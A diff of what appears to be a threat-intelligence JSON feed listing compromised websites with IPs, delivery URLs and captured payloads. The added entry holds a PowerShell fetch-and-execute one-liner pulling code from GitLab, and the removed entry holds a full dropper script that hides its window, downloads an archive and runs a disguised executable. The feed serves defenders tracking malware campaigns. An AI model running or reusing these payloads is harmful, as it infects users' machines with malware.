@@ -1,5 +1,25 @@
 [
   {
+    "UrlDomain": "pterygiumhouston.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "192.254.188.210"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwm6nfdo1scb0omllphe87cz",
+    "ScannedAt": "2026-11-18T13:54:31.270000+00:00"
+  },
+  {
     "UrlDomain": "ozgeozturkguzelliksalonu.com",
     "DeliveryUrl": [
       "fbifr.com"
@@ -5555,24 +5575,5 @@
     ],
     "ReportId": "cmwjgekmp17wn0omlkwsofjbb",
     "ScannedAt": "2026-11-16T16:04:15.798000+00:00"
-  },
-  {
-    "UrlDomain": "futureexpected.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "77.37.83.140"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwjbc38k17of0omlpeppcn8t",
-    "ScannedAt": "2026-11-16T13:42:21.861000+00:00"
   }
 ]
